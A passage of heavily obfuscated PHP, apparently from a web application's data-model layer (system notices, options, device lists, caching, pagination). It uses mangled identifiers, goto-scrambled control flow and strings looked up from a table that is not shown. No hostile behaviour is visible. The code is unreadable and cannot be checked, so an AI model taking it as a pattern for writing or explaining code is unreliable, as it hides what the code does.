unset($Eñ†³£‡õ [$b–„ŒÅ‘ó]); continue; } goto d­¾½ÕÌ«; D†ñ‡èÔå»: } $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[425]] = $Fç¥‹¦”·»; goto Fµ´ÁÊ¯Ã…; eâø´«º±: } $this->clearSystemPathLog($Dó¦ùÃ„¯†); goto CÀöÍ¹œÊö; bŒâ‘°´œ–: $D×‹£ŸĞŞì =& $_SERVER[Š‰]; $c¤±ŒØÍçì = array_to_keyvalue($Eñ†³£‡õ , $D×‹£ŸĞŞì[33], $D×‹£ŸĞŞì[1500]); $e†¬Ì„øò = Model($D×‹£ŸĞŞì[501])->userListInfo(array_unique($c¤±ŒØÍçì)); goto cÉŒ¯±×Ä; cÉŒ¯±×Ä: $fœ¹­Ö…²Ñ = $this->getSourceList($Eñ†³£‡õ ); $c‰˜®çÑ = $this->typeAll(); $e„õš¢àí = array(); goto cğìÁ¤£©Ø; CÀöÍ¹œÊö: return $e„õš¢àí; goto f¸ä±ÔÌ¼â; f¸ä±ÔÌ¼â: } private function clearSystemPathLog($EØµÁŸ ì¢) { $aäœÍ•·Û™ =& $_SERVER[Š‰]; if (count($EØµÁŸ ì¢) == 0) { return; } $FÜãò™ƒÚÑ = array($aäœÍ•·Û™[388] => array($aäœÍ•·Û™[7], array_unique($EØµÁŸ ì¢))); $this->where($FÜãò™ƒÚÑ)->delete(); } public function deviceList($Bò¢Äº»‚, $bå˜ õÂ›½ = 0) { $FÄïšÜ‘Õ =& $_SERVER[Š‰]; $d„”ŒÏ¨ÖÂ = array($FÄïšÜ‘Õ[1500] => $Bò¢Äº»‚, $FÄïšÜ‘Õ[192] => array($FÄïšÜ‘Õ[948], $bå˜ õÂ›½), $FÄïšÜ‘Õ[29] => $FÄïšÜ‘Õ[1603]); $dáËœæÛ¦ = array(); $B—£Š¶½Ñ = $this->field($FÄïšÜ‘Õ[2068])->where($d„”ŒÏ¨ÖÂ)->order($FÄïšÜ‘Õ[1889])->limit(50)->select(); foreach ($B—£Š¶½Ñ as $Dœ£–á“Äˆ => $f‰é—èÏíî) { goto C“ÙÙĞ¦ê; C“ÙÙĞ¦ê: if ($Dœ£–á“Äˆ > 0 && abs($f‰é—èÏíî[$FÄïšÜ‘Õ[192]] - $B—£Š¶½Ñ[$Dœ£–á“Äˆ - 1][$FÄïšÜ‘Õ[192]]) < 5) { continue; } $fÕ¾‚…šŞ¿ = json_decode($f‰é—èÏíî[$FÄïšÜ‘Õ[425]], !0); $f‰é—èÏíî[$FÄïšÜ‘Õ[2060]] = isset($fÕ¾‚…šŞ¿[$FÄïšÜ‘Õ[2060]]) ? $fÕ¾‚…šŞ¿[$FÄïšÜ‘Õ[2060]] : $FÄïšÜ‘Õ[33]; goto C‘­„’Şá; C‘­„’Şá: unset($fÕ¾‚…šŞ¿[$FÄïšÜ‘Õ[2060]]); $d…ù¢…ó› = $this->deviceType($fÕ¾‚…šŞ¿[$FÄïšÜ‘Õ[1880]]); if (isset($dáËœæÛ¦[$d…ù¢…ó›])) { continue; } goto cÉ»„–«¢†; cÉ»„–«¢†: $this->ipAddress($f‰é—èÏíî); $f‰é—èÏíî[$FÄïšÜ‘Õ[425]] = $fÕ¾‚…šŞ¿; $dáËœæÛ¦[$d…ù¢…ó›] = $f‰é—èÏíî; goto dÜã¡æ‰; dÜã¡æ‰: } return array_values($dáËœæÛ¦); } public function deviceType($AØº÷ñØÉÎ) { return $AØº÷ñØÉÎ; } } goto E±öÊ¿´›…; E±öÊ¿´›…: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\156\157\x74\x69\143\145\x4c\x69\163\164"; public $field = array("\x6e\141\155\145", "\x63\x6f\156\x74\145\x6e\164", "\x61\165\x74\150", "\x6d\x6f\x64\x65", "\x74\151\x6d\145", "\x74\x79\160\x65", "\154\x65\x76\x65\x6c", "\145\156\x61\x62\x6c\x65", "\x73\157\x72\164"); public function listData($E¤ğéµ…ÒÄ = false, $Dçİ´ˆ¼›ï = "\163\157\162\x74", $A–„É¬ˆô‘ = false) { return parent::listData($E¤ğéµ…ÒÄ, $Dçİ´ˆ¼›ï, $A–„É¬ˆô‘); } public function add($cŠ‘‡ÈÃ³–) { $e½øùé¼¦› =& $_SERVER[Š‰]; $Fñâ¸ø½ØÏ = time(); if ($cŠ‘‡ÈÃ³–[$e½øùé¼¦›[12]] == $e½øùé¼¦›[2069]) { $Fñâ¸ø½ØÏ = strtotime($cŠ‘‡ÈÃ³–[$e½øùé¼¦›[195]]); } $cŠ‘‡ÈÃ³–[$e½øùé¼¦›[195]] = $Fñâ¸ø½ØÏ; return parent::insert($cŠ‘‡ÈÃ³–); } public function update($f“ĞİŒÑ¼, $DÎ˜õ­Øîœ) { goto D¿÷³Ï¯ä‚; a­ª£Ş»¶: return parent::update($f“ĞİŒÑ¼, $DÎ˜õ­Øîœ); goto fÌæÔÊ­; Dé’Üó›¹î: $EèËğÌêŞğ = time(); if ($DÎ˜õ­Øîœ[$e…ôøŠ¢¥[12]] == $e…ôøŠ¢¥[2069]) { $EèËğÌêŞğ = strtotime($DÎ˜õ­Øîœ[$e…ôøŠ¢¥[195]]); } $DÎ˜õ­Øîœ[$e…ôøŠ¢¥[195]] = $EèËğÌêŞğ; goto a­ª£Ş»¶; D¿÷³Ï¯ä‚: $e…ôøŠ¢¥ =& $_SERVER[Š‰]; $Fî…Âæí‚ = $this->listData($f“ĞİŒÑ¼); if (!$Fî…Âæí‚) { return !1; } goto Dé’Üó›¹î; fÌæÔÊ­: } public function remove($CøÁÔÛ‰«Ñ) { $eƒ¿ºâÇ§ = $this->listData($CøÁÔÛ‰«Ñ); if (!$eƒ¿ºâÇ§ || $eƒ¿ºâÇ§[$_SERVER[Š‰][1145]]) { return !1; } return parent::remove($CøÁÔÛ‰«Ñ); } public function sort($f‰šôÈµÜŸ, $c×šœõ•˜Ñ) { return parent::update($f‰šôÈµÜŸ, $c×šœõ•˜Ñ); } public function enable($C¨÷›°„™, $F²ó¼”‚õ) { return parent::update($C¨÷›°„™, array($_SERVER[Š‰][2070] => $F²ó¼”‚õ)); } private function initUserOption() { $CĞ…°ùİ˜´ =& $_SERVER[Š‰]; $this->optionType = $CĞ…°ùİ˜´[2071]; $this->modelType = $CĞ…°ùİ˜´[2072]; $this->field = array($CĞ…°ùİ˜´[2073], $CĞ…°ùİ˜´[28], $CĞ…°ùİ˜´[195], $CĞ…°ùİ˜´[29], $CĞ…°ùİ˜´[2074], $CĞ…°ùİ˜´[702], $CĞ…°ùİ˜´[189]); } public function userNoticeGet($DÅÊÔó™µ’ = false) { $this->initUserOption(); return parent::listData($DÅÊÔó™µ’, $_SERVER[Š‰][388], !0); } public function userNoticeAdd($a·‹Õëˆ‘ˆ) { $aí¸ª²İ =& $_SERVER[Š‰]; $this->initUserOption(); $b‹¥Ê¾¿Ó÷ = $this->findByKey($aí¸ª²İ[2073], $a·‹Õëˆ‘ˆ[$aí¸ª²İ[388]]); if ($b‹¥Ê¾¿Ó÷) { return !0; } $FÌŠ”‹èÀ¾ = array($aí¸ª²İ[2073] => $a·‹Õëˆ‘ˆ[$aí¸ª²İ[388]], $aí¸ª²İ[28] => $a·‹Õëˆ‘ˆ[$aí¸ª²İ[28]], $aí¸ª²İ[195] => $a·‹Õëˆ‘ˆ[$aí¸ª²İ[195]], $aí¸ª²İ[29] => isset($a·‹Õëˆ‘ˆ[$aí¸ª²İ[29]]) ? $a·‹Õëˆ‘ˆ[$aí¸ª²İ[29]] : 1, $aí¸ª²İ[2074] => isset($a·‹Õëˆ‘ˆ[$aí¸ª²İ[2074]]) ? $a·‹Õëˆ‘ˆ[$aí¸ª²İ[2074]] : 0, $aí¸ª²İ[702] => 0, $aí¸ª²İ[189] => 0); return parent::insert($FÌŠ”‹èÀ¾); } public function userNoticeEdit($dÆö¯À˜, $bãÉÀ¥Ç) { $this->initUserOption(); return parent::update($dÆö¯À˜, $bãÉÀ¥Ç); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\x6f\160\x74\x69\157\x6e"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\x6c\145", "\x72\x6f\154\145\x47\162\x6f\165\x70", "\x72\145\147\x69\163\x74", "\145\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($c–ÄÃ”œïÆ) { return "\123\x79\163\164\145\155\x4f\160\x74\151\x6f\x6e\x5f{$c–ÄÃ”œïÆ}"; } protected function optionDefault($aŒ±ÒîÙ×ê = '') { $Fª©°µ…¾‹ =& $_SERVER[Š‰]; if ($aŒ±ÒîÙ×ê == $Fª©°µ…¾‹[33]) { return $GLOBALS[$Fª©°µ…¾‹[6]][$Fª©°µ…¾‹[376]]; } } } class SystemRecordModel extends ModelBaseLight { } goto E½­æÆ°ˆ; D§¨“«³é˜: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\x79\124\x69\155\x65", "\164\151\155\x65", "\151\156\163\x65\162\164\x2c\165\x70\x64\141\164\x65", "\146\165\x6e\143\164\x69\157\156"), array("\143\x72\x65\141\x74\x65\x54\x69\x6d\145", "\164\x69\x6d\145", "\151\156\163\145\x72\164", "\x66\165\156\x63\x74\151\x6f\x6e")); public function setDataAuto($e‚ÖÖâ™) { $this->dataAuto = $e‚ÖÖâ™; } public function __construct($AøÕ†ºò”» = '', $cÒœËøñ÷Ï = '', $a´ÌÁÑŠ” = '') { parent::__construct($AøÕ†ºò”», $cÒœËøñ÷Ï, $a´ÌÁÑŠ”); } public static function textEncode($dæ½Ùµƒ‰§) { if (!$dæ½Ùµƒ‰§) { return $dæ½Ùµƒ‰§; } $D‡ŸµÌ·× = json_encode($dæ½Ùµƒ‰§); $D‡ŸµÌ·× = preg_replace_callback($_SERVER[Š‰][351], function ($f£”åÛŸíó) { return addslashes($f£”åÛŸíó[0]); }, $D‡ŸµÌ·×); return json_decode($D‡ŸµÌ·×); } public static function textDecode($bĞÈË¿¼…®) { $BİØæã¿éÄ =& $_SERVER[Š‰]; $FÚ‰Şó¹ = json_encode($bĞÈË¿¼…®); $FÚ‰Şó¹ = preg_replace_callback($BİØæã¿éÄ[352], function ($AÄÀàù¹ï) { return $_SERVER[Š‰][96]; }, $FÚ‰Şó¹); return json_decode($FÚ‰Şó¹); } protected $tableMeta = array(); protected function _beforeInsert(&$Bç¨•ËÛÅÎ, $A…­ŠÀè›Ë) { $D’ƒ‰à‹„² =& $_SERVER[Š‰]; if (!$this->checkDataAutoHas($D’ƒ‰à‹„²[353])) { return; } $this->dataBeforeFilter($Bç¨•ËÛÅÎ, $D’ƒ‰à‹„²[353]); } protected function _beforeUpdate(&$EÆ“äãŠÁ, $f‘÷‹Ë©ïÉ) { $Béä Á©‚ =& $_SERVER[Š‰]; if (!$this->checkDataAutoHas($Béä Á©‚[354])) { return; } $this->dataBeforeFilter($EÆ“äãŠÁ, $Béä Á©‚[354]); } protected function _afterSelect(&$A§øâ—ÓÍ, $D²Ší«ÂÃ) { if (!is_array($A§øâ—ÓÍ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Š‰][355])) { return; } foreach ($A§øâ—ÓÍ as &$Fƒ¯®„µî«) { $this->dataAfterFilter($Fƒ¯®„µî«); } unset($Fƒ¯®„µî«); } protected function _afterFind(&$cÁİ«¾‰“·, $FŞåğ¿Ò»Ú) { if (!is_array($cÁİ«¾‰“·)) { return; } if (!$this->checkDataAutoHas($_SERVER[Š‰][355])) { return; } $this->dataAfterFilter($cÁİ«¾‰“·); } public function setAutoIncrement($C˜ÇËŒ¥ß) { $cÚ„†÷»•ƒ = array($this->getPk() => $C˜ÇËŒ¥ß); $a¸ššø°å— = $this->data($cÚ„†÷»•ƒ)->add(); if ($a¸ššø°å—) { $this->delete($a¸ššø°å—); } } public function getAutoIncrement() { $bø†ÀáŒØò = $this->getTableName(); $CğÂøÙÏÉ = $this->max($this->getPk()); $b–î“ĞäË– = $this->query("\163\x68\x6f\167\x20\x74\x61\x62\154\x65\40\163\x74\x61\x74\165\x73\x20\x77\x68\x65\x72\x65\x20\x4e\141\x6d\x65\x3d\x27{$bø†ÀáŒØò}\47"); $fĞÙŠ„Ò„ = $b–î“ĞäË–[0][$_SERVER[Š‰][356]]; $eíÙåÍóÙ = max($CğÂøÙÏÉ, $fĞÙŠ„Ò„); return $eíÙåÍóÙ; } protected function _callBefore($C¢Æ—è¨ÎÊ, $F«ìñèÓ…Š) { return $this->cacheCallCheck($C¢Æ—è¨ÎÊ, $F«ìñèÓ…Š, !1); } protected function _callAfter($DŞŒ©ÔÅñµ, $A—Ç…ê—Æ) { return $this->cacheCallCheck($DŞŒ©ÔÅñµ, $A—Ç…ê—Æ, !0); } protected function cacheFunctionAlias($cÉÏ‹Ó¦Ñå) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($D‡˜Ü˜À, $fäÜ÷ê×é, $b“ˆ¶Âæ = false) { $c„É‚Âİ•÷ = $this->cacheFunctionAlias($fäÜ÷ê×é); if (!$c„É‚Âİ•÷) { return; } foreach ($c„É‚Âİ•÷ as $d‡ƒ¢É‹ì· => $Dàè†ğ…·) { $c¹Ô×”œ©Ê = $Dàè†ğ…·[0]; $A­â˜Ñ£Îë = explode($_SERVER[Š‰][47], $Dàè†ğ…·[1]); if ($D‡˜Ü˜À == $d‡ƒ¢É‹ì·) { return $this->cacheFunctionGet($d‡ƒ¢É‹ì·, $c¹Ô×”œ©Ê); } if ($b“ˆ¶Âæ && in_array($D‡˜Ü˜À, $A­â˜Ñ£Îë)) { $this->cacheFunctionClear($d‡ƒ¢É‹ì·, $c¹Ô×”œ©Ê); } } } public function cacheFunctionGet($A®Ò½ò„½, $AÅÃÄ¸¢¨³) { $bìÌ”×ô­ó = $this->cacheKeyMake($A®Ò½ò„½, $AÅÃÄ¸¢¨³); $b´Âè¼¢ùŒ = Cache::get($bìÌ”×ô­ó); if (!is_array($b´Âè¼¢ùŒ)) { $b´Âè¼¢ùŒ = call_user_func_array(array($this, $A®Ò½ò„½), array($AÅÃÄ¸¢¨³, !0)); Cache::set($bìÌ”×ô­ó, $b´Âè¼¢ùŒ); } return $b´Âè¼¢ùŒ; } public function cacheFunctionClear($aØ…”öİ†³, $eœœ ˜‚ÉÓ) { $B²ãÒ—¼†ğ = $eœœ ˜‚ÉÓ; if (!is_array($eœœ ˜‚ÉÓ)) { $B²ãÒ—¼†ğ = array($eœœ ˜‚ÉÓ); } foreach ($B²ãÒ—¼†ğ as $bèÄÎ„Ø¿ğ) { $eÊÎË‡Î„¼ = $this->cacheKeyMake($aØ…”öİ†³, $bèÄÎ„Ø¿ğ); Cache::remove($eÊÎË‡Î„¼); } } private function cacheKeyMake($c¥ŒìÇ«ë¸, $a’¬¯ŠËÆÒ) { $AŒÌ˜Ç˜¾² =& $_SERVER[Š‰]; return get_class($this) . $AŒÌ˜Ç˜¾²[70] . $c¥ŒìÇ«ë¸ . $AŒÌ˜Ç˜¾²[357] . $a’¬¯ŠËÆÒ; } protected function selectPageReset() { $B’“ğ¶ÀÒÂ =& $_SERVER[Š‰]; if (isset($GLOBALS[$B’“ğ¶ÀÒÂ[358]])) { return; } $GLOBALS[$B’“ğ¶ÀÒÂ[358]] = isset($GLOBALS[$B’“ğ¶ÀÒÂ[7]][$B’“ğ¶ÀÒÂ[359]]) ? $GLOBALS[$B’“ğ¶ÀÒÂ[7]][$B’“ğ¶ÀÒÂ[359]] : !1; $GLOBALS[$B’“ğ¶ÀÒÂ[360]] = isset($GLOBALS[$B’“ğ¶ÀÒÂ[7]][$B’“ğ¶ÀÒÂ[349]]) ? $GLOBALS[$B’“ğ¶ÀÒÂ[7]][$B’“ğ¶ÀÒÂ[349]] : !1; $GLOBALS[$B’“ğ¶ÀÒÂ[7]][$B’“ğ¶ÀÒÂ[359]] = !1; $GLOBALS[$B’“ğ¶ÀÒÂ[7]][$B’“ğ¶ÀÒÂ[349]] = !1; } protected function selectPageRestore() { $AŸ¾’§ó× =& $_SERVER[Š‰]; if (!isset($GLOBALS[$AŸ¾’§ó×[358]])) { return; } $GLOBALS[$AŸ¾’§ó×[7]][$AŸ¾’§ó×[359]] = $GLOBALS[$AŸ¾’§ó×[358]]; $GLOBALS[$AŸ¾’§ó×[7]][$AŸ¾’§ó×[349]] = $GLOBALS[$AŸ¾’§ó×[360]]; unset($GLOBALS[$AŸ¾’§ó×[358]]); unset($GLOBALS[$AŸ¾’§ó×[360]]); } protected function selectPage($E§‘èÛ÷Î¬ = 200, $BœÜŸÒšÍ… = 1) { goto fÍÔÕÂ£˜õ; A ­òôÇŠ: $E§‘èÛ÷Î¬ = $E§‘èÛ÷Î¬ <= 5 ? 5 : ($E§‘èÛ÷Î¬ >= $cŠ¦¨óÍ“ ? $cŠ¦¨óÍ“ : $E§‘èÛ÷Î¬); $BœÜŸÒšÍ… = intval(isset($in[$d­øšõ²[349]]) && $in[$d­øšõ²[349]] ? $in[$d­øšõ²[349]] : $BœÜŸÒšÍ…); $BœÜŸÒšÍ… = $BœÜŸÒšÍ… <= 1 ? 1 : $BœÜŸÒšÍ…; goto aë´²ö¿¯Á; fÍÔÕÂ£˜õ: $d­øšõ² =& $_SERVER[Š‰]; global $in; $cè×¬‘Õ– = $this->optionsValue(); goto d¿Ëê„ïÖê; aë´²ö¿¯Á: $EÄé… ‡ˆƒ = array(); $cõî÷ä«› = 1; if ($BœÜŸÒšÍ… == 1 && $cõî÷ä«›) { $this->optionsValue($cè×¬‘Õ–); $EÄé… ‡ˆƒ = $this->page($BœÜŸÒšÍ…, $E§‘èÛ÷Î¬)->select(); if (!is_array($EÄé… ‡ˆƒ) || count($EÄé… ‡ˆƒ) < $E§‘èÛ÷Î¬) { $DÓ¹ã¥Èá° = count($EÄé… ‡ˆƒ); $f²•…™µ = 1; } else { $this->optionsValue($BÒ…ÂÎî—); $DÓ¹ã¥Èá° = intval($this->count()); $f²•…™µ = ceil($DÓ¹ã¥Èá° / $E§‘èÛ÷Î¬); } } else { $this->optionsValue($BÒ…ÂÎî—); $DÓ¹ã¥Èá° = intval($this->count()); $f²•…™µ = ceil($DÓ¹ã¥Èá° / $E§‘èÛ÷Î¬); $BœÜŸÒšÍ… = $BœÜŸÒšÍ… >= $f²•…™µ ? $f²•…™µ : $BœÜŸÒšÍ…; $this->optionsValue($cè×¬‘Õ–); $EÄé… ‡ˆƒ = $this->page($BœÜŸÒšÍ…, $E§‘èÛ÷Î¬)->select(); } goto fÙš÷çÉ; fÙš÷çÉ: if (!is_array($EÄé… ‡ˆƒ)) { $EÄé… ‡ˆƒ = array(); } if ($f²•…™µ == 1) { $DÓ¹ã¥Èá° = count($EÄé… ‡ˆƒ); } $a‘³¦ÆôÕ = array($d­øšõ²[362] => array($d­øšõ²[363] => $DÓ¹ã¥Èá°, $d­øšõ²[359] => $E§‘èÛ÷Î¬, $d­øšõ²[349] => $BœÜŸÒšÍ…, $d­øšõ²[364] => $f²•…™µ), $d­øšõ²[365] => $EÄé… ‡ˆƒ); goto F—‚ËªØã³; F—‚ËªØã³: return $a‘³¦ÆôÕ; goto bîïÀïà… ; d¿Ëê„ïÖê: $cŠ¦¨óÍ“ = 50000; $E§‘èÛ÷Î¬ = isset($in[$d­øšõ²[359]]) && $in[$d­øšõ²[359]] ? $in[$d­øšõ²[359]] : $E§‘èÛ÷Î¬; if ($E§‘èÛ÷Î¬ === -1) { $in[$d­øšõ²[359]] = !1; $cŠ¦¨óÍ“ = 100000000; $E§‘èÛ÷Î¬ = $cŠ¦¨óÍ“; } goto fë„¤×Óšù; fë„¤×Óšù: $BÒ…ÂÎî— = $cè×¬‘Õ–; $BÒ…ÂÎî—[$d­øšõ²[361]] = array(); $E§‘èÛ÷Î¬ = intval($E§‘èÛ÷Î¬); goto A ­òôÇŠ; bîïÀïà… : } protected function checkLength($e‰æµ·ÄÍ, $EÒ¼•¼Ââ = 0, $dÎí—–­æ = '') { $a¥Ï°ñ°Í„ =& $_SERVER[Š‰]; $EÒ¼•¼Ââ = $EÒ¼•¼Ââ ? $EÒ¼•¼Ââ : 65536; if (!$e‰æµ·ÄÍ || strlen($e‰æµ·ÄÍ) < $EÒ¼•¼Ââ) { return; } $dÎí—–­æ = $dÎí—–­æ ? $dÎí—–­æ . $a¥Ï°ñ°Í„[67] : $a¥Ï°ñ°Í„[33]; show_json($dÎí—–­æ . LNG($a¥Ï°ñ°Í„[366]) . "\50{$EÒ¼•¼Ââ}\x29", !1); } protected function metaSet($Bº¨Ñ‰×±é, $aøÒ×ñö“¸ = null, $C¸ÛôÈäÖ = null) { goto A„‘Ÿ¤¥È; Aæˆ¡èÉÔ: CacheLock::unlock($CŸğÀçŠ»); return !0; goto A÷¯ƒöêøé; F¸Ğ½˜å‹–: if (is_string($aøÒ×ñö“¸)) { $fåÆ–Âá°¾[$aøÒ×ñö“¸] = $C¸ÛôÈäÖ; } $C£äõ¢Æà¦ = array(); foreach ($fåÆ–Âá°¾ as $Eá†Œê‘éÑ => $AëÄ›’œ´±) { $this->checkLength($AëÄ›’œ´±, !1, $dÊ†¸Õåò¿ . $D‘šĞ¿Š’¢[4] . $Eá†Œê‘éÑ); $C£äõ¢Æà¦[] = array($eôÙ›•Äè‰ => $Bº¨Ñ‰×±é, $D‘šĞ¿Š’¢[92] => $Eá†Œê‘éÑ, $D‘šĞ¿Š’¢[370] => $AëÄ›’œ´±); } goto Bè×¼³ÏÀ¸; A„‘Ÿ¤¥È: $D‘šĞ¿Š’¢ =& $_SERVER[Š‰]; if (!$this->tableMeta || !$Bº¨Ñ‰×±é) { return !1; } $eôÙ›•Äè‰ = $this->tableMeta[$D‘šĞ¿Š’¢[367]]; goto aÉƒìãİĞˆ; aÉƒìãİĞˆ: $dÊ†¸Õåò¿ = $this->tableMeta[$D‘šĞ¿Š’¢[368]]; $d¿Îå¼¹‡Ã = Model($dÊ†¸Õåò¿); $bÁŠê±š…Á = array($eôÙ›•Äè‰ => $Bº¨Ñ‰×±é, $D‘šĞ¿Š’¢[369] => $aøÒ×ñö“¸); goto Aˆ°šì‡ñ; Aˆ°šì‡ñ: if (is_null($aøÒ×ñö“¸)) { return $d¿Îå¼¹‡Ã->where(array($eôÙ›•Äè‰ => $Bº¨Ñ‰×±é))->delete(); } if (is_null($C¸ÛôÈäÖ) && is_string($aøÒ×ñö“¸)) { return $d¿Îå¼¹‡Ã->where($bÁŠê±š…Á)->delete(); } $fåÆ–Âá°¾ = is_array($aøÒ×ñö“¸) ? $aøÒ×ñö“¸ : array(); goto F¸Ğ½˜å‹–; Bè×¼³ÏÀ¸: $CŸğÀçŠ» = $D‘šĞ¿Š’¢[371] . $this->tableMeta; CacheLock::lock($CŸğÀçŠ»); $d¿Îå¼¹‡Ã->where(array($eôÙ›•Äè‰ => $Bº¨Ñ‰×±é))->addAll($C£äõ¢Æà¦, array(), !0); goto Aæˆ¡èÉÔ; A÷¯ƒöêøé: } public function metaGet($C”×¬éæ‡, $bòğÊïØ = false) { goto d®Ÿ¥ÊŒ“»; DÚ±ª„àä: $Bİ¯›Ñî· = Model($this->tableMeta[$eòİßƒ´‡‰[368]]); if ($bòğÊïØ) { $eºá¨»¥Ïä = array($F„™²Ä©ô– => $C”×¬éæ‡, $eòİßƒ´‡‰[92] => $bòğÊïØ); return $Bİ¯›Ñî·->where($eºá¨»¥Ïä)->getField($eòİßƒ´‡‰[370]); } $eºá¨»¥Ïä = array($F„™²Ä©ô– => $C”×¬éæ‡); goto b¼ùÏ¼Ã©œ; d®Ÿ¥ÊŒ“»: $eòİßƒ´‡‰ =& $_SERVER[Š‰]; if (!$this->tableMeta) { return array(); } $F„™²Ä©ô– = $this->tableMeta[$eòİßƒ´‡‰[367]]; goto DÚ±ª„àä; b¼ùÏ¼Ã©œ: $dÌš­ ™÷­ = $Bİ¯›Ñî·->field($eòİßƒ´‡‰[372])->where($eºá¨»¥Ïä)->select(); $dÌš­ ™÷­ = array_to_keyvalue($dÌš­ ™÷­, $eòİßƒ´‡‰[92], $eòİßƒ´‡‰[370]); return $dÌš­ ™÷­; goto dä’‹áŞÆ‚; dä’‹áŞÆ‚: } private function checkDataAutoHas($fÀÕŠØÑ¢) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $B¦¿ä¿ïŠÏ) { if (in_array($fÀÕŠØÑ¢, explode($_SERVER[Š‰][47], $B¦¿ä¿ïŠÏ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$a«×´°Œ ´, $AŒğ¤•º¬‰) { $b„ãÙ¡ºÄ =& $_SERVER[Š‰]; foreach ($this->dataAuto as $F¶ÍÆ­÷Æ) { $c¼ìè ™¡ç = $F¶ÍÆ­÷Æ[0]; if (!in_array($AŒğ¤•º¬‰, explode($b„ãÙ¡ºÄ[47], $F¶ÍÆ­÷Æ[2]))) { continue; } switch (trim($F¶ÍÆ­÷Æ[3])) { case $b„ãÙ¡ºÄ[317]: case $b„ãÙ¡ºÄ[318]: $A…·Ã¡è˜ = $F¶ÍÆ­÷Æ[1]; $d·¶ÃÅÃó = isset($F¶ÍÆ­÷Æ[4]) ? (array) $F¶ÍÆ­÷Æ[4] : array(); if ($A…·Ã¡è˜ == $b„ãÙ¡ºÄ[195] && array_key_exists($c¼ìè ™¡ç, $a«×´°Œ ´)) { if (!$a«×´°Œ ´[$c¼ìè ™¡ç]) { unset($a«×´°Œ ´[$c¼ìè ™¡ç]); } break; } if (isset($a«×´°Œ ´[$c¼ìè ™¡ç])) { array_unshift($d·¶ÃÅÃó, $a«×´°Œ ´[$c¼ìè ™¡ç]); } if ($b„ãÙ¡ºÄ[317] == $F¶ÍÆ­÷Æ[3]) { $a«×´°Œ ´[$c¼ìè ™¡ç] = call_user_func_array($A…·Ã¡è˜, $d·¶ÃÅÃó); } else { $a«×´°Œ ´[$c¼ìè ™¡ç] = call_user_func_array(array(&$this, $A…·Ã¡è˜), $d·¶ÃÅÃó); } break; case $b„ãÙ¡ºÄ[269]: $a«×´°Œ ´[$c¼ìè ™¡ç] = $a«×´°Œ ´[$F¶ÍÆ­÷Æ[1]]; break; case $b„ãÙ¡ºÄ[290]: if (isset($a«×´°Œ ´[$c¼ìè ™¡ç]) && !is_string($a«×´°Œ ´[$c¼ìè ™¡ç])) { $a«×´°Œ ´[$c¼ìè ™¡ç] = json_encode_force($a«×´°Œ ´[$c¼ìè ™¡ç]); } break; case $b„ãÙ¡ºÄ[319]: if ($a«×´°Œ ´[$c¼ìè ™¡ç] === $b„ãÙ¡ºÄ[33]) { unset($a«×´°Œ ´[$c¼ìè ™¡ç]); } break; case $b„ãÙ¡ºÄ[320]: $a«×´°Œ ´[$c¼ìè ™¡ç] = $F¶ÍÆ­÷Æ[1]; default: break; } } if ($AŒğ¤•º¬‰ == $b„ãÙ¡ºÄ[353]) { $B«Æåï†ğ = strtolower($this->db->getDbType()); if (strpos($B«Æåï†ğ, $b„ãÙ¡ºÄ[9]) !== 0) { return; } $Aî™É‘ïŠ = $this->field(!0)->fields; $CšÌÑ£öà• = $Aî™É‘ïŠ[$b„ãÙ¡ºÄ[248]]; if (isset($Aî™É‘ïŠ[$b„ãÙ¡ºÄ[247]])) { unset($CšÌÑ£öà•[$Aî™É‘ïŠ[$b„ãÙ¡ºÄ[247]]]); } foreach ($CšÌÑ£öà• as $AŠëëŞ‹ƒ => $AŒğ¤•º¬‰) { if (!isset($a«×´°Œ ´[$AŠëëŞ‹ƒ])) { $a«×´°Œ ´[$AŠëëŞ‹ƒ] = $b„ãÙ¡ºÄ[33]; } } } } private function dataAfterFilter(&$b³¢ùƒš) { $BàÒãÉÂ¿£ =& $_SERVER[Š‰]; foreach ($this->dataAuto as $Cä–£µÍÉ) { $E˜œ³ø±¦ = $Cä–£µÍÉ[0]; if (!in_array($BàÒãÉÂ¿£[355], explode($BàÒãÉÂ¿£[47], $Cä–£µÍÉ[2]))) { continue; } if (!isset($b³¢ùƒš[$E˜œ³ø±¦])) { continue; } switch (trim($Cä–£µÍÉ[3])) { case $BàÒãÉÂ¿£[317]: case $BàÒãÉÂ¿£[318]: $E‚šœÇÅ = isset($Cä–£µÍÉ[4]) ? (array) $Cä–£µÍÉ[4] : array(); array_unshift($E‚šœÇÅ, $b³¢ùƒš[$E˜œ³ø±¦]); if ($BàÒãÉÂ¿£[317] == $Cä–£µÍÉ[3]) { $b³¢ùƒš[$E˜œ³ø±¦] = call_user_func_array($Cä–£µÍÉ[1], $E‚šœÇÅ); } else { $b³¢ùƒš[$E˜œ³ø±¦] = call_user_func_array(array(&$this, $Cä–£µÍÉ[1]), $E‚šœÇÅ); } break; case $BàÒãÉÂ¿£[269]: $b³¢ùƒš[$E˜œ³ø±¦] = $b³¢ùƒš[$Cä–£µÍÉ[1]]; break; case $BàÒãÉÂ¿£[290]: $BŸÖÉ„…´Ë = $b³¢ùƒš[$E˜œ³ø±¦]; $b³¢ùƒš[$E˜œ³ø±¦] = json_decode($BŸÖÉ„…´Ë, !0); if (is_null($b³¢ùƒš[$E˜œ³ø±¦])) { $b³¢ùƒš[$E˜œ³ø±¦] = $BŸÖÉ„…´Ë; } break; case $BàÒãÉÂ¿£[319]: if ($b³¢ùƒš[$E˜œ³ø±¦] === $BàÒãÉÂ¿£[33]) { unset($b³¢ùƒš[$E˜œ³ø±¦]); } break; case $BàÒãÉÂ¿£[320]: $b³¢ùƒš[$E˜œ³ø±¦] = $Cä–£µÍÉ[1]; default: break; } } } public function saveAll($DĞ¬”İ˜Â) { goto C˜ÉñÇ¹Ù; C±Ê³ô…Ô­: $this->chunkEventSet(); goto BªºÀÃÂëÁ; 